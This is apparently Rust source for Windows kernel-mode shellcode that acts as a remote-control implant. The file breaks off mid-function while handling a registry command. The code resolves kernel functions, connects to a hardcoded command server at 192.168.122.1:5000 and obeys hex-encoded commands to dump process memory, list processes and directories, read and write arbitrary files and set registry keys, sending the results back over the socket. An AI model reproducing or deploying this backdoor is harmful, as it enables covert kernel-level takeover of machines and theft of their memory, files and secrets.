#![no_std]
#![feature(asm)]
#![feature(core_intrinsics)]
use core::arch::asm;


#[repr(u32)]
enum ScrapeType {
    Module = 0,
    Memory = 1,
}

#[repr(C, packed)]
struct ScrapeInfo {
    scrape_type: ScrapeType,
    size: u32,
    address: u64,
}

#[no_mangle]
unsafe extern "stdcall"
fn _DllMainCRTStartup(
    _hinst_dll: *const u8,
    _fdw_reason: u32,
    _lpv_reserved: *const u8
) -> u64
{
    match shellcode_start() {
        Ok(_) => 0,
        Err(x) => x as _,
    }
}

unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
    // let nt_base = resolver::find_nt_base_address();
    let nt_base: ntdef::types::PVOID;
	asm!(
		"mov {0}, 0xfffff8024f205000",
		out(reg) nt_base
	);

    let ex_allocate_pool: ntdef::functions::ExAllocatePool = ntproc::find!("ExAllocatePool");

    let tdi_ctx: *mut nttdi::TdiContext = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<nttdi::TdiContext>()
    ) as _;

    let mem_funcs: *mut ntmem::MemDumpFuncs = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntmem::MemDumpFuncs>()
    ) as _;

    let fs_funcs: *mut ntfs::FsFuncs = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntfs::FsFuncs>()
    ) as _;    

    let reg_funcs: *mut ntreg::RegFuncs = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntreg::RegFuncs>()
    ) as _;

    let proc_funcs: *mut ntuser::ProcFuncs = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntuser::ProcFuncs>()
    ) as _;

    (*tdi_ctx).funcs.ex_allocate_pool =                     ex_allocate_pool;
    (*tdi_ctx).funcs.ex_free_pool_with_tag =                ntproc::find!("ExFreePoolWithTag");
    (*tdi_ctx).funcs.io_allocate_mdl =                      ntproc::find!("IoAllocateMdl");
    (*tdi_ctx).funcs.io_build_device_io_control_request =   ntproc::find!("IoBuildDeviceIoControlRequest");
    (*tdi_ctx).funcs.io_get_related_device_object =         ntproc::find!("IoGetRelatedDeviceObject");
    (*tdi_ctx).funcs.iof_call_driver =                      ntproc::find!("IofCallDriver");
    (*tdi_ctx).funcs.ke_initialize_event =                  ntproc::find!("KeInitializeEvent");
    (*tdi_ctx).funcs.ke_wait_for_single_object =            ntproc::find!("KeWaitForSingleObject");
    (*tdi_ctx).funcs.ob_reference_object_by_handle =        ntproc::find!("ObReferenceObjectByHandle");
    (*tdi_ctx).funcs.zw_create_file =                       ntproc::find!("ZwCreateFile");
    (*tdi_ctx).funcs.mm_probe_and_lock_pages =              ntproc::find!("MmProbeAndLockPages");
    (*tdi_ctx).funcs.ke_raise_irql_to_dpc_level =           ntproc::find!("KeRaiseIrqlToDpcLevel");
    //(*tdi_ctx).funcs.ke_lower_irql =                        ntproc::find!("KeLowerIrql");

    (*mem_funcs).ke_stack_attach_process =                  ntproc::find!("KeStackAttachProcess");
    (*mem_funcs).ke_unstack_detach_process =                ntproc::find!("KeUnstackDetachProcess");
    (*mem_funcs).mm_secure_virtual_memory =                 ntproc::find!("MmSecureVirtualMemory");
    (*mem_funcs).mm_unsecure_virtual_memory =               ntproc::find!("MmUnsecureVirtualMemory");
    (*mem_funcs).obf_dereference_object =                   ntproc::find!("ObfDereferenceObject");
    (*mem_funcs).ps_get_process_image_file_name =           ntproc::find!("PsGetProcessImageFileName");
    (*mem_funcs).ps_lookup_process_by_process_id =          ntproc::find!("PsLookupProcessByProcessId");
    (*mem_funcs).zw_query_information_process =             ntproc::find!("ZwQueryInformationProcess");
    (*mem_funcs).zw_query_virtual_memory =                  ntproc::find!("ZwQueryVirtualMemory");

    
    (*fs_funcs).zw_create_file =                            (*tdi_ctx).funcs.zw_create_file;
    (*fs_funcs).zw_query_directory_file =                   ntproc::find!("ZwQueryDirectoryFile");
    (*fs_funcs).zw_close =                                  ntproc::find!("ZwClose");
    (*fs_funcs).ex_allocate_pool =                          ex_allocate_pool;
    (*fs_funcs).ex_free_pool_with_tag =                     (*tdi_ctx).funcs.ex_free_pool_with_tag;
    (*fs_funcs).zw_write_file =                             ntproc::find!("ZwWriteFile");
    (*fs_funcs).zw_read_file =                              ntproc::find!("ZwReadFile");


    (*reg_funcs).zw_close =                                 (*fs_funcs).zw_close;
    (*reg_funcs).ex_allocate_pool =                         ex_allocate_pool;
    (*reg_funcs).ex_free_pool_with_tag =                    (*tdi_ctx).funcs.ex_free_pool_with_tag;
    (*reg_funcs).zw_open_key =                              ntproc::find!("ZwOpenKey");
    (*reg_funcs).zw_query_value_key =                       ntproc::find!("ZwQueryValueKey");
    (*reg_funcs).zw_create_key =                            ntproc::find!("ZwCreateKey");
    (*reg_funcs).zw_set_value_key =                         ntproc::find!("ZwSetValueKey");


    (*proc_funcs).ex_free_pool_with_tag =                   (*tdi_ctx).funcs.ex_free_pool_with_tag;
    (*proc_funcs).ex_allocate_pool =                        ex_allocate_pool;
    (*proc_funcs).zw_allocate_virtual_memory =              ntproc::find!("ZwAllocateVirtualMemory");
    (*proc_funcs).ke_unstack_detach_process =               (*mem_funcs).ke_unstack_detach_process;
    (*proc_funcs).ke_stack_attach_process =                 (*mem_funcs).ke_stack_attach_process;
    (*proc_funcs).ps_get_process_image_file_name =          (*mem_funcs).ps_get_process_image_file_name;
    (*proc_funcs).ps_lookup_process_by_process_id =         (*mem_funcs).ps_lookup_process_by_process_id;
    (*proc_funcs).obf_dereference_object =                  (*mem_funcs).obf_dereference_object;
    (*proc_funcs).zw_create_io_completion =                 ntproc::find!("ZwCreateIoCompletion");

    let zw_set_information_worker_factory: ntdef::functions::ZwSetInformationWorkerFactory;
    asm!(
        "mov {1}, {0}",
        "add {1}, 0x3f8b70",
        in(reg) nt_base,
        out(reg) zw_set_information_worker_factory
    );
    (*proc_funcs).zw_set_information_worker_factory =       zw_set_information_worker_factory;

    let zw_create_worker_factory: ntdef::functions::ZwCreateWorkerFactory;
    asm!(
        "mov {1}, {0}",
        "add {1}, 0x3f7110",
        in(reg) nt_base,
        out(reg) zw_create_worker_factory
    );
    (*proc_funcs).zw_create_worker_factory =                zw_create_worker_factory;

    (*proc_funcs).io_completion_handle =                    ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntdef::types::HANDLE>()
    ) as _;
    (*proc_funcs).worker_factory_handle =                   ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntdef::types::HANDLE>()
    ) as _;
    (*proc_funcs).minimum_threads_ptr =                     ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<u32>()
    ) as _;
    (*proc_funcs).user_address_ptr =                        ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntdef::types::PVOID>()
    ) as _;
    (*proc_funcs).process_ptr =                             ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntdef::structs::PEPROCESS>()
    ) as _;


    let rtl_get_version: ntdef::functions::RtlGetVersion = ntproc::find!("RtlGetVersion");
    let ps_terminate_system_thread: ntdef::functions::PsTerminateSystemThread = ntproc::find!("PsTerminateSystemThread");
    // let ps_create_system_thread: ntdef::functions::PsCreateSystemThread = ntproc::find!("PsCreateSystemThread");
    let mut version: ntdef::structs::RTL_OSVERSIONINFOW = core::mem::MaybeUninit::uninit().assume_init();
    version.dwOSVersionInfoSize = core::mem::size_of_val(&version) as _;
    rtl_get_version(&mut version as *mut _ as _);

    (*tdi_ctx).msg_available = 0u32;
    (*tdi_ctx).app_buffer = ((*tdi_ctx).funcs.ex_allocate_pool)(ntdef::enums::POOL_TYPE::NonPagedPool, 1460 as _);

    use nttdi::Socket;
    let mut socket = nttdi::TdiSocket::new(tdi_ctx);
    socket.add_recv_handler(recv_handler);
    socket.connect(0x017aa8c0, 0x8813)?;  // 192.168.122.1:5000

    let hello = [0x68u8, 0x65u8, 0x6cu8, 0x6cu8, 0x6fu8, 0x0au8];
	let _ = socket.send(&hello as *const u8, 6 as _);

    let buf: ntdef::types::PVOID = ((*tdi_ctx).funcs.ex_allocate_pool)(
        ntdef::enums::POOL_TYPE::NonPagedPool, 1460 as _
    );

    let scratch_buf: ntdef::types::PVOID = ((*tdi_ctx).funcs.ex_allocate_pool)(
        ntdef::enums::POOL_TYPE::NonPagedPool, 3000 as _
    );
    
    let mut buf_len: u32 = 0;
    let mut exec: u32 = 0 as _;

    let mut close: u8 = 0;
    while close == 0u8 {
        /*
        while (*tdi_ctx).msg_available == 0u32 {
            asm!("nop");
        }

        if (*tdi_ctx).msg_available == 1u32 {
            buf_len = (*tdi_ctx).buf_len as _;
            ntdef::macros::RtlCopyMemory(buf as _, (*tdi_ctx).app_buffer as _, buf_len as _);
            exec = 1 as _;
            (*tdi_ctx).msg_available = 0u32;
        }
        */
        (buf_len, exec) = recv_msg(tdi_ctx, buf);

        if exec == 1u32 {
            let echo_cmd = [0x65u8, 0x63u8, 0x68u8, 0x6fu8, 0x20u8];
            let close_cmd = [0x63u8, 0x6cu8, 0x6fu8, 0x73u8, 0x65u8, 0x0au8];
            let version_cmd = [0x76u8, 0x65u8, 0x72u8, 0x73u8, 0x69u8, 0x6fu8, 0x6eu8, 0x0au8];
            let dump_cmd = [0x64u8, 0x75u8, 0x6du8, 0x70u8, 0x20u8];
            let pslist_cmd = [0x70u8, 0x73u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x0au8];
            let dir_cmd = [0x64u8, 0x69u8, 0x72u8, 0x20u8];
            let write_cmd = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8];
            let read_cmd = [0x72u8, 0x65u8, 0x61u8, 0x64u8, 0x20u8];
            let queryvalkey_cmd = [0x71u8, 0x75u8, 0x65u8, 0x72u8, 0x79u8, 0x76u8, 0x61u8, 0x6cu8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8];
            let setkey_cmd = [0x73u8, 0x65u8, 0x74u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8];
            let usermode_cmd = [0x75u8, 0x73u8, 0x65u8, 0x72u8, 0x6du8, 0x6fu8, 0x64u8, 0x65u8, 0x20u8];
            if ntdef::macros::RtlEqualMemory(buf as _, &echo_cmd as _, 5) == 1u32 {
                let _ = socket.send((buf as *const u8).offset(5) as *const u8, buf_len - 5);
            } else if ntdef::macros::RtlEqualMemory(buf as _, &close_cmd as _, 6) == 1u32 {
                _ = socket.close();
                close = 1 as _;
            } else if ntdef::macros::RtlEqualMemory(buf as _, &version_cmd as _, 8) == 1u32 {
                let _ = socket.send(&version as *const _ as _, core::mem::size_of_val(&version) as _);
            } else if ntdef::macros::RtlEqualMemory(buf as _, &dump_cmd as _, 5) == 1u32 {
                let proc_name_hash = resolver::hash::fnv1a_32_hash((buf as *const u8).offset(5) as _, true, false);
                let mut proc_found: u32 = 1 as _;
                let mut memdump = match ntmem::MemoryDumper::new(mem_funcs, proc_name_hash as _) {
                    Ok(x) => x,
                    Err(_) => {
                        proc_found = 0 as _;
                        core::mem::MaybeUninit::uninit().assume_init()
                    }
                };
                if proc_found == 1 as _ {
                    let proc_found_msg = [0x70u8, 0x72u8, 0x6fu8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x20u8, 0x66u8, 0x6fu8, 0x75u8, 0x6eu8, 0x64u8, 0x2cu8, 0x20u8, 0x64u8, 0x75u8, 0x6du8, 0x70u8, 0x20u8, 0x73u8, 0x74u8, 0x61u8, 0x72u8, 0x74u8, 0x73u8, 0x0au8];
                    let _ = socket.send(&proc_found_msg as *const u8, 27 as _);
                    let mut i: isize = 0;
                    let memdump_max_iterations: isize = 100;
                    let mut go_on: u32 = 1;
                    while go_on == 1 as _ {
                        if i >= memdump_max_iterations {
                            go_on = 0 as _;
                        } else {
                            let (address, size, nameptr) = match memdump.next_module() {
                                Ok(x) => x,
                                Err(_) => {
                                    go_on = 0 as _;
                                    core::mem::MaybeUninit::uninit().assume_init()
                                }
                            };
                            if go_on == 1 as _ {
                                let region_info = ScrapeInfo { scrape_type: ScrapeType::Module, address: address as _, size: size as _ };
                                let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
                                let _ = socket.send(nameptr as _, 100);
                                i = i + 1;
                            }
                        }
                    }
                    i = 0;
                    go_on = 1;
                    while go_on == 1 as _ {
                        if i >= memdump_max_iterations {
                            go_on = 0 as _;
                        } else {
                            let (address, size) = match memdump.next_range() {
                                Ok(x) => x,
                                Err(_) => {
                                    go_on = 0 as _;
                                    core::mem::MaybeUninit::uninit().assume_init()
                                }
                            };
                            if go_on == 1 as _ {
                                let region_info = ScrapeInfo { scrape_type: ScrapeType::Memory, address: address as _, size: size as _ };
                                let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
                                let _ = socket.send(address as _, size as _);
                                i = i + 1;
                            }
                        }
                    }
                    let dump_finished_msg = [0x0au8, 0x64u8, 0x75u8, 0x6du8, 0x70u8, 0x20u8, 0x66u8, 0x69u8, 0x6eu8, 0x69u8, 0x73u8, 0x68u8, 0x65u8, 0x64u8, 0x0au8];
                    let _ = socket.send(&dump_finished_msg as *const u8, 15 as _);
                    // destructor is called implicitly
                    // memdump.drop();
                } else {
                    let proc_not_found_msg = [0x70u8, 0x72u8, 0x6fu8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x20u8, 0x6eu8, 0x6fu8, 0x74u8, 0x20u8, 0x66u8, 0x6fu8, 0x75u8, 0x6eu8, 0x64u8, 0x0au8];
                    let _ = socket.send(&proc_not_found_msg as *const u8, 18 as _);
                }
            } else if ntdef::macros::RtlEqualMemory(buf as _, &pslist_cmd as _, 7) == 1u32 {
                let pslist_start_msg = [0x70u8, 0x72u8, 0x6fu8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x73u8, 0x74u8, 0x61u8, 0x72u8, 0x74u8, 0x0au8];
                let _ = socket.send(&pslist_start_msg as *const u8, 22 as _);
                let mut pid: u32 = 0x0;
                while pid < 0xffff as _ {
                    pid += 4;
                    let mut process: ntdef::structs::PEPROCESS = core::ptr::null_mut();
                    let status = ((*mem_funcs).ps_lookup_process_by_process_id)(pid as _, &mut process as _);
    
                    if !ntdef::macros::NT_SUCCESS(status) {
                        continue;
                    }
                    
                    let proc_name = ((*mem_funcs).ps_get_process_image_file_name)(process);
                    let name_len = ntdef::macros::Strlen(proc_name as _);
                    ntdef::macros::RtlCopyMemory(buf as _, proc_name as _, name_len as _);
                    ((*mem_funcs).obf_dereference_object)(process);
                    *(buf as *mut u8).offset(name_len as _) = 0x0au8; // add newline
                    let _ = socket.send(buf as *const u8, (name_len+1) as _);
                }
                let pslist_end_msg = [0x70u8, 0x72u8, 0x6fu8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x65u8, 0x6eu8, 0x64u8, 0x0au8];
                let _ = socket.send(&pslist_end_msg as *const u8, 20 as _);
            } else if ntdef::macros::RtlEqualMemory(buf as _, &dir_cmd as _, 4) == 1u32 {
                /*
                let not_implemented_msg = [0x6eu8, 0x6fu8, 0x74u8, 0x20u8, 0x69u8, 0x6du8, 0x70u8, 0x6cu8, 0x65u8, 0x6du8, 0x65u8, 0x6eu8, 0x74u8, 0x65u8, 0x64u8, 0x0au8];
                let _ = socket.send(&not_implemented_msg as *const u8, 16);
                */             
                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                let mut dir_open_error: u32 = 0;
                let mut handle: ntdef::types::HANDLE = scratch_buf as _;
                let _ = match ntfs::open_directory(
                    fs_funcs, (buf as *const u8).offset(4) as _, &mut handle as _, 1460 as _
                ) {
                        0 => 0,
                        _ => {
                            dir_open_error = 1 as _;
                            1
                        }
                    };
                if dir_open_error == 0 as _ {
                    let mut file_names_information = buf as ntdef::structs::PFILE_NAMES_INFORMATION;
                    let status = ntfs::query_directory(fs_funcs, handle, file_names_information as _, 1460 as _);
                    if status == 0 as _ {
                        let dir_send_start_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x65u8, 0x64u8, 0x2cu8, 0x20u8, 0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x73u8, 0x0au8];
                        let newline_msg = [0x0au8];
                        let _ = socket.send(&dir_send_start_msg as *const u8, 32 as _);
                        let mut last_iteration_was_done: u32 = 0;
                        while last_iteration_was_done == 0 as _ {
                            // note: FileName is wide character array
                            // when NextEntryOffset == 0, it is the last iteration to do
                            let file_name: *const u16 = &((*file_names_information).FileName) as _;
                            let file_name_length = ((*file_names_information).FileNameLength);
                            let _ = socket.send(file_name as _, file_name_length as _);
                            let _ = socket.send(&newline_msg as *const u8, 1 as _);
                            if (*file_names_information).NextEntryOffset == 0 {
                                last_iteration_was_done = 1 as _;
                            } else {
                                file_names_information = (file_names_information as *mut u8).offset(
                                    (*file_names_information).NextEntryOffset as _
                                ) as ntdef::structs::PFILE_NAMES_INFORMATION;
                            }
                        }
                        let dir_listing_finished_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6eu8, 0x69u8, 0x73u8, 0x68u8, 0x65u8, 0x64u8, 0x0au8];
                        let _ = socket.send(&dir_listing_finished_msg as *const u8, 27 as _);
                    } else {
                        let error_while_querying_opened_dir_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x68u8, 0x69u8, 0x6cu8, 0x65u8, 0x20u8, 0x71u8, 0x75u8, 0x65u8, 0x72u8, 0x79u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x65u8, 0x64u8, 0x20u8, 0x64u8, 0x69u8, 0x72u8, 0x0au8];
                        let _ = socket.send(&error_while_querying_opened_dir_msg as *const u8, 32 as _);
                    }
                    ntfs::close_handle(fs_funcs, handle);
                } else {
                    let dir_open_error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x69u8, 0x74u8, 0x68u8, 0x20u8, 0x73u8, 0x70u8, 0x65u8, 0x63u8, 0x69u8, 0x66u8, 0x69u8, 0x65u8, 0x64u8, 0x20u8, 0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x0au8];
                    let _ = socket.send(&dir_open_error_msg as *const u8, 31);
                }
            } else if ntdef::macros::RtlEqualMemory(buf as _, &write_cmd as _, 6) == 1u32 {
                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                let mut file_open_error: u32 = 0 as _;
                let mut handle: ntdef::types::HANDLE = scratch_buf as _;
                let _ = match ntfs::open_file(
                    fs_funcs, (buf as *const u8).offset(6) as _, &mut handle as _, 1460 as _, 1
                ) {
                    0 => 0,
                    _ => {
                        file_open_error = 1 as _;
                        1
                    }
                };
                if file_open_error == 0 as _ {
                    let mut status: u32 = 0;
                    while status == 0 {
                        let send_data_to_write_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x64u8, 0x61u8, 0x74u8, 0x61u8, 0x20u8, 0x74u8, 0x6fu8, 0x20u8, 0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x0au8];                    
                        let _ = socket.send(&send_data_to_write_msg as *const u8, 19);
                        (buf_len, exec) = recv_msg(tdi_ctx, buf);
                        status = ntfs::write_file(fs_funcs, handle, buf as _, buf_len as _);
                        if status == 0 as _ {
                            let write_success_msg = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
                            let _ = socket.send(&write_success_msg as *const u8, 14);
                        } else {
                            let write_failed_msg = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8, 0x66u8, 0x61u8, 0x69u8, 0x6cu8, 0x65u8, 0x64u8, 0x0au8];
                            let _ = socket.send(&write_failed_msg as *const u8, 13);                        
                        }
                        if buf_len < 1460 as _ {
                            /*
                            It is a break from the while; the idea is that if the C2 server sends less
                            than the maximum number of bytes it can send, then it doesn't have
                            anything else to send.
                            */
                            status = 1;
                        }
                    }
                    ntfs::close_handle(fs_funcs, handle);
                } else {
                    let file_open_error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x68u8, 0x69u8, 0x6cu8, 0x65u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x73u8, 0x70u8, 0x65u8, 0x63u8, 0x69u8, 0x66u8, 0x69u8, 0x65u8, 0x64u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x0au8];
                    let _ = socket.send(&file_open_error_msg as *const u8, 35);
                }
            } else if ntdef::macros::RtlEqualMemory(buf as _, &read_cmd as _, 5) == 1u32 {
                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                let mut file_open_error: u32 = 0 as _;
                let mut handle: ntdef::types::HANDLE = scratch_buf as _;
                let _ = match ntfs::open_file(
                    fs_funcs, (buf as *const u8).offset(5) as _, &mut handle as _, 1460 as _, 0
                ) {
                    0 => 0,
                    _ => {
                        file_open_error = 1 as _;
                        1
                    }
                };
                if file_open_error == 0 as _ {
                    let mut status: u32 = 2;
                    let mut n_bytes_read: u32;
                    while status == 2 as _ {
                        (status, n_bytes_read) = ntfs::read_file(fs_funcs, handle, buf as _, 1460 as _);
                        if status != 1 as _ {
                            let _ = socket.send(buf as *const u8, n_bytes_read as _);
                        }
                    }
                    ntfs::close_handle(fs_funcs, handle);
                } else {
                    let file_open_error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x68u8, 0x69u8, 0x6cu8, 0x65u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x73u8, 0x70u8, 0x65u8, 0x63u8, 0x69u8, 0x66u8, 0x69u8, 0x65u8, 0x64u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x0au8];
                    let _ = socket.send(&file_open_error_msg as *const u8, 35);
                }
            } else if ntdef::macros::RtlEqualMemory(buf as _, &queryvalkey_cmd as _, 12) == 1u32 {
                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                let mut key_open_error: u32 = 0 as _;
                let mut handle: ntdef::types::HANDLE = scratch_buf as _;
                let _ = match ntreg::open_key(
                    reg_funcs, (buf as *const u8).offset(12) as _, &mut handle as _, 1460 as _, 0
                ) {
                    0 => 0,
                    _ => {
                        key_open_error = 1 as _;
                        1
                    }
                };
                if key_open_error == 0 as _ {
                    let send_value_name_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x74u8, 0x68u8, 0x65u8, 0x20u8, 0x76u8, 0x61u8, 0x6cu8, 0x75u8, 0x65u8, 0x20u8, 0x6eu8, 0x61u8, 0x6du8, 0x65u8, 0x0au8];
                    let _ = socket.send(&send_value_name_msg as *const u8, 20);
                    (buf_len, exec) = recv_msg(tdi_ctx, buf);
                    *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                    let mut status: u32;
                    let mut res_len: u32;
                    let value_name: ntdef::structs::PUNICODE_STRING = ntdef::macros::BuildUnicodeStringFromCharArray(
                        ex_allocate_pool as _, buf as _, 1460
                    );
                    let query_buf = (ex_allocate_pool)(
                        ntdef::enums::POOL_TYPE::NonPagedPool, 200 as _
                    );
                    (status, res_len) = ntreg::query_value_key(
                        reg_funcs, handle, value_name, query_buf as _, 200
                    );
                    if status == 0 as _ {
                        let _ = socket.send(query_buf as *const u8, res_len);
                    } else {
                        let error_query_value_key_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x69u8, 0x6eu8, 0x20u8, 0x71u8, 0x75u8, 0x65u8, 0x72u8, 0x79u8, 0x20u8, 0x76u8, 0x61u8, 0x6cu8, 0x75u8, 0x65u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x0au8];
                        let _ = socket.send(&error_query_value_key_msg as *const u8, 25);
                    }
                    ((*reg_funcs).ex_free_pool_with_tag)(value_name as _, 71);
                    ((*reg_funcs).ex_free_pool_with_tag)(query_buf as _, 71);
                    ntreg::close_handle(reg_funcs, handle);
                } else {
                    let key_open_error_msg = [0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
                    let _ = socket.send(&key_open_error_msg as *const u8, 15);
                }
            } else if ntdef::macros::RtlEqualMemory(buf as _, &setkey_cmd as _, 7) == 1u32 {
                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                let reg_key: *mut u8 = (buf as *mut u8).offset(7) as _;

                let mut key_create_error: u32 = 0 as _;
                let mut handle: ntdef::types::HANDLE = scratch_buf as _;
                let _ = match ntreg::create_key(reg_funcs, reg_key as _, &mut handle as _, 1460 as _) {
                    0 => 0,
                    _ => {
                        key_create_error = 1 as _;
                        1
                    }
                };
                if key_create_error == 0 as _ {
                    let send_the_subkey_name_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x74u8, 0x68u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x62u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x6eu8, 0x61u8, 0x6du8, 0x65u8, 0x0au8];
                    let _ = socket.send(&send_the_subkey_name_msg as *const u8, 21);

                    (buf_len, exec) = recv_msg(tdi_ctx, buf);
                    *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                    
                    let subkey_name: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, (buf_len*2) as _) as _;
                    ntdef::macros::RtlCopyMemory(subkey_name as _, buf as _, buf_len as _);
                    let subkey_name_buf_size = buf_len*2;    // needed for unicode

                    let send_the_subkey_type_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x74u8, 0x68u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x62u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x74u8, 0x79u8, 0x70u8, 0x65u8, 0x0au8];
                    let _ = socket.send(&send_the_subkey_type_msg as *const u8, 21);

                    (buf_len, exec) = recv_msg(tdi_ctx, buf);
                    let key_type: ntdef::types::ULONG;
                    let reg_sz_cmp = [0x52u8, 0x45u8, 0x47u8, 0x5fu8, 0x53u8, 0x5au8];
                    let reg_dword_cmp = [0x52u8, 0x45u8, 0x47u8, 0x5fu8, 0x44u8, 0x57u8, 0x4fu8, 0x52u8, 0x44u8];
                    let reg_binary_cmp = [0x52u8, 0x45u8, 0x47u8, 0x5fu8, 0x42u8, 0x49u8, 0x4eu8, 0x41u8, 0x52u8, 0x59u8];
                    let matched: u32;
                    if ntdef::macros::RtlEqualMemory(buf as _, &reg_sz_cmp as _, 5) == 1u32 {
                        key_type = ntdef::enums::REG_SZ;
                        matched = 1 as _;
                    } else if ntdef::macros::RtlEqualMemory(buf as _, &reg_dword_cmp as _, 9) == 1u32 {
                        key_type = ntdef::enums::REG_DWORD;
                        matched = 1 as _;
                    } else if ntdef::macros::RtlEqualMemory(buf as _, &reg_binary_cmp as _, 10) == 1u32 {
                        key_type = ntdef::enums::REG_BINARY;
                        matched = 1 as _;
                    } else {
                        key_type = ntdef::enums::REG_NONE;
                        matched = 0 as _;
                    }

                    if matched == 1 as _ {
                        let send_the_subkey_value_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x74u8, 0x68u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x62u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x76u8, 0x61u8, 0x6cu8, 0x75u8, 0x65u8, 0x0au8];
                        let _ = socket.send(&send_the_subkey_value_msg as *const u8, 22);
                        (buf_len, exec) = recv_msg(tdi_ctx, buf);
                        let subkey_value: ntdef::types::PVOID;
                        let subkey_value_buf_size: u32;
                        if key_type == ntdef::enums::REG_SZ {
                            *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                            subkey_value = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, (buf_len*2) as _) as _;
                            ntdef::macros::RtlZeroMemory(subkey_value as _, (buf_len*2) as _);
